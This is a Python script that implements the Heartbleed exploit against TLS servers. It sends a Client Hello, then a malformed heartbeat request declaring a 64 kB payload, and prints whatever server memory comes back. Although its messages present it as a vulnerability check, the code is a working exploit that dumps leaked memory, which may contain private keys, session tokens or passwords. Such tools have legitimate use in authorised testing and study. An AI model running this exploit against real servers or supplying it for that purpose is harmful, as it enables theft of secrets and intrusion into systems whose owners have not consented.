#!/usr/bin/python3
import sys, os, time
import struct, socket, select
import argparse, codecs, string

def main():
    '''
    Entry main
    '''
    parser = argparse.ArgumentParser()
    reqd = parser.add_argument_group('required arguments')
    reqd.add_argument('-t','--target',action='store',dest='tar',help='Target IP')
    reqd.add_argument('-p','--port',action='store',dest='prt',help='Target port')
    parser.add_argument('-r','--raw',action='store_true',dest='raw',help='Output raw bytes')

    args = parser.parse_args()

    os.system('') # Win10 hack. Sets Win10 terminal for color output. Not sure why it works
    effect = effects()

    # Build 'hello' packet
    helloPacket = (
        '16 03 02 00 31' # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
        '01 00 00 2d'	 # Message type = 01 (client hello); Length = 00 00 2d
        '03 02' 	 # Client version = 03 02 (TLS 1.1)
        '50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
        '00' 		 # Session id = 00
        '00 04 ' 	 # Cipher suite length
        '00 33 c0 11'	 # 4 cipher suites
        '01'		 # Compression methods length
        '00'		 # Compression method 0: no compression = 0
        '00 00'		 # Extensions length = 0
    ).replace(' ', '')

    helloPacket = codecs.decode(helloPacket, 'hex')

    # Build socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(effect.bl_prefix+effect.blue_msg("Connecting..."))
    sys.stdout.flush()
    # Make connection
    sock.connect((args.tar, int(args.prt)))
    print(effect.bl_prefix+effect.blue_msg("Sending Client Hello..."))
    sys.stdout.flush()
    # Send the 'hello' packet
    sock.send(helloPacket)
    print(effect.bl_prefix+effect.blue_msg("Waiting for Server Hello..."))
    sys.stdout.flush()
    # Wait for the servers response
    while True:
        content_type, version, payload = receive_tls_msg(sock, effect)
        if content_type == None:
            print(effect.b_prefix+effect.err_msg("Server closed connection without sending Server Hello."))
            return
        # Check for server 'hello done' message.
        if content_type == 22 and payload[0] == 0x0E:
            break
  
    print(effect.bl_prefix+effect.blue_msg("Sending heartbeat request..."))
    sys.stdout.flush()
    # Send the heartbleed exploit
    content_type, payload = bleed(sock, effect)
    if content_type is None:
        print(effect.g_prefix+effect.good_msg("No heartbeat response received, server likely not vulnerable"))
    elif content_type == 24:
        print(effect.bl_prefix+effect.blue_msg("Received heartbeat response:"))
        prnt_pkt_data(payload, args.raw)
        if len(payload) > 3:
            print(effect.b_prefix+effect.err_msg("WARNING: server returned more data than it should - server is vulnerable!"))
        else:
            print(effect.g_prefix+effect.good_msg("Server processed malformed heartbeat, but did not return any extra data."))
    elif content_type == 21:
        print(effect.b_prefix+effect.err_msg("Received alert:"))
        prnt_pkt_data(payload, args.raw)
        print(effect.g_prefix+effect.good_msg("Server returned error, likely not vulnerable"))

    sys.exit(0)

def prnt_pkt_data(sock, raw):
    '''
    Print recieved data
    @param socket
    @param boolean raw
    '''
    if not raw:
        data = ''.join((str(chr(c)) if 32 <= c <= 126 else '') for c in sock)
        print(data)
    else:
        data = ''.join((hex(c)+' ' if 32 <= c <= 126 else '') for c in sock)
        i = 0
        while i < len(data):
            tmp_str = ''
            for j in range(60):
                if i >= len(data):
                    break
                tmp_str = tmp_str+data[i]
                i += 1
            print(tmp_str)

def receive_tls_msg(sock, effect, fragments=1):
    '''
    Recieve TLS message from socket connection
    @param socket
    @param Object effect
    @param int fragments
    @return struct header data
    '''
    content_type = None
    version = None
    length = None
    payload = b''
    
    # Collect the fragmented data
    for fragmentIndex in range(0, fragments):
        tls_header = recv_pkt(sock, 5) # Receive 5 byte header (Content type, version, and length)
	
        if tls_header is None:
            return content_type, version, payload # Return None
	
        content_type, version, length = struct.unpack('>BHH', tls_header) # Unpack the header
        payload_tmp = recv_pkt(sock, length) # Receive data server said it sent

        if payload_tmp is None:
            return content_type, version, payload # Return None
	
        print(effect.bl_prefix+effect.blue_msg("Received message: type = %d, ver = %04x, length = %d") %
              (content_type, version, len(payload_tmp)))
	
        payload = payload + payload_tmp
	
    return content_type, version, payload

def recv_pkt(sock, length):
    '''
    Recieve packet from socket
    @param socket
    @param int length
    @return byte string
    '''
    timeout = 5
    t_end = time.time() + timeout
    recv_data = b''
    remain = length
    while remain > 0:
        recv_time = t_end - time.time()
        if recv_time < 0:
            return None
        r, w, e = select.select([sock],[],[],5)
        if sock in r:
            data = sock.recv(remain)
            if not data:
                return None
            recv_data += data
            remain -= len(data)
    return recv_data

def bleed(sock, effect):
    '''
    Build and send 'heartbleed' exploit
    @param socket
    @param Object effect
    '''
    # Build 'heartbleed' packet
    heartbleedPacket = (
        '18 03 02 00 03' # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
        '01 FF FF'		 # Heartbeat message type = 01 (request); Payload length = FF FF
    ).replace(' ', '')

    heartbleedPacket = codecs.decode(heartbleedPacket, 'hex')
    # Send the packet
    sock.send(heartbleedPacket)
    # We asked for 64 kB, so we should get 4 packets
    content_type, version, payload = receive_tls_msg(sock, effect, 4)
    return content_type, payload

class effects(object):
    '''
    Terminal color object
    '''
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    g_prefix = "["+GREEN+"*"+ENDC+"] "
    b_prefix = "["+RED+"*"+ENDC+"] "
    w_prefix = "["+YELLOW+"*"+ENDC+"] "
    bl_prefix = "["+BLUE+"*"+ENDC+"] "
    
    def warn_msg(self, in_str):
        '''
        Warning message
        @param String in_str
        @return String yellow
        '''
        return self.YELLOW+in_str+self.ENDC
    
    def err_msg(self, in_str):
        '''
        Error message
        @param String in_str
        @return String red
        '''
        return self.RED+in_str+self.ENDC
    
    def good_msg(self, in_str):
        '''
        Good message
        @param String in_str
        @return String green
        '''
        return self.GREEN+in_str+self.ENDC

    def blue_msg(self, in_str):
        '''
        Normal message
        @param String in_str
        @return String blue
        '''
        return self.BLUE+in_str+self.ENDC

if __name__ == "__main__":
    main()
